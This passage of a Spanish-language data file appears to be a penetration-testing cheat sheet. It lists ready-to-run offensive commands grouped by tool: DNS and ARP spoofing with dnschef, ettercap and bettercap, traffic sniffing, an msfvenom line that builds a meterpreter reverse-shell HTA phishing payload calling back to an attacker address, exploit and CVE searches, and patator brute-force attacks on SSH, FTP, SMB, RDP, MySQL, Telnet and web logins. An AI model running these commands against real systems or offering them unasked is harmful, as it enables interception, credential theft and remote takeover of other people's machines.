    "cmd": "dnschef --fakeip IP --fakedomains objetivo.com -i 0.0.0.0 &",
    "desc": "DNS spoof"
   },
   {
    "cmd": "ettercap -T -M arp:remote // //",
    "desc": "ARP"
   },
   {
    "cmd": "bettercap -eval 'net.probe on; arp.spoof on; net.sniff on'",
    "desc": "Bettercap"
   },
   {
    "cmd": "urlsnarf -i eth0",
    "desc": "Urlsnarf"
   },
   {
    "cmd": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f hta-psh -o p.hta",
    "desc": "HTA phish"
   }
  ]
 },
 {
  "tool": "exploit-search",
  "desc": "Búsqueda de exploits (web y local)",
  "commands": [
   {
    "cmd": "searchsploit 'remote code execution' | head -20",
    "desc": "RCE"
   },
   {
    "cmd": "searchsploit -w 'linux kernel'",
    "desc": "URLs"
   },
   {
    "cmd": "searchsploit 'php 8.0'",
    "desc": "PHP 8"
   },
   {
    "cmd": "curl -s 'https://cve.circl.lu/api/search/linux' | jq '.[0:5]'",
    "desc": "CIRCL CVE"
   },
   {
    "cmd": "curl -s 'https://cve.circl.lu/api/cve/CVE-2021-41773' | jq .",
    "desc": "CVE lookup"
   },
   {
    "cmd": "curl -s 'https://cvepremium.circl.lu/api/cve/CVE-2021-41773' | jq .",
    "desc": "CVE premium"
   },
   {
    "cmd": "curl -s 'https://www.exploit-db.com/search?q=apache' -A 'Mozilla/5.0' | grep -oP 'exploits/[0-9]+' | head",
    "desc": "EDB web"
   },
   {
    "cmd": "searchsploit --exclude='DoS' apache",
    "desc": "Excluir DoS"
   },
   {
    "cmd": "grep -r 'CVE-2021' /usr/share/exploitdb/ | head",
    "desc": "Grep local"
   },
   {
    "cmd": "searchsploit -j 'vsftpd' | jq '.RESULTS_EXPLOIT[].Path'",
    "desc": "JSON"
   },
   {
    "cmd": "curl -s 'https://api.github.com/search/repositories?q=exploit+CVE-2021-41773' | jq '.items[].clone_url'",
    "desc": "GitHub"
   },
   {
    "cmd": "msfconsole -q -x 'search type:exploit platform:linux -S 2021'",
    "desc": "MSF search"
   },
   {
    "cmd": "msfconsole -q -x 'search cve:2021'",
    "desc": "MSF CVE"
   },
   {
    "cmd": "msfconsole -q -x 'search type:auxiliary -S scanner'",
    "desc": "MSF aux"
   }
  ]
 },
 {
  "tool": "patator",
  "desc": "Brute force multifunción (patator)",
  "commands": [
   {
    "cmd": "patator ssh_login host=IP user=FILE0 password=FILE1 0=users.txt 1=pass.txt",
    "desc": "SSH"
   },
   {
    "cmd": "patator ftp_login host=IP user=FILE0 password=FILE1 0=u.txt 1=p.txt",
    "desc": "FTP"
   },
   {
    "cmd": "patator http_fuzz url='http://IP/FUZZ' 0=dirs.txt",
    "desc": "Dir fuzz"
   },
   {
    "cmd": "patator http_fuzz url='http://IP/login' method=POST body='user=admin&pass=FILE0' 0=pass.txt",
    "desc": "POST brute"
   },
   {
    "cmd": "patator smb_login host=IP user=FILE0 password=FILE1 0=u.txt 1=p.txt",
    "desc": "SMB"
   },
   {
    "cmd": "patator mysql_login host=IP user=FILE0 password=FILE1 0=u.txt 1=p.txt",
    "desc": "MySQL"
   },
   {
    "cmd": "patator rdp_login host=IP user=FILE0 password=FILE1 0=u.txt 1=p.txt",
    "desc": "RDP"
   },
   {
    "cmd": "patator ssh_login host=IP user=admin password=FILE0 0=pass.txt -x ignore:code=401",
    "desc": "Ignorar"
   },
   {
    "cmd": "patator dns_bruteforce host=IP name=FILE0 0=subs.txt",
    "desc": "DNS"
   },
   {
    "cmd": "patator http_fuzz url='http://IP/FUZZ' 0=dirs.txt -x ignore:fgrep='404'",
    "desc": "Filtrar"
   },
   {
    "cmd": "patator snmp_login host=IP community=FILE0 0=com.txt",
    "desc": "SNMP"
   },
   {
    "cmd": "patator telnet_login host=IP user=FILE0 password=FILE1 0=u.txt 1=p.txt",
    "desc": "Telnet"
   },
   {
    "cmd": "patator --help",
    "desc": "Ayuda"
   }
  ]
 }
];
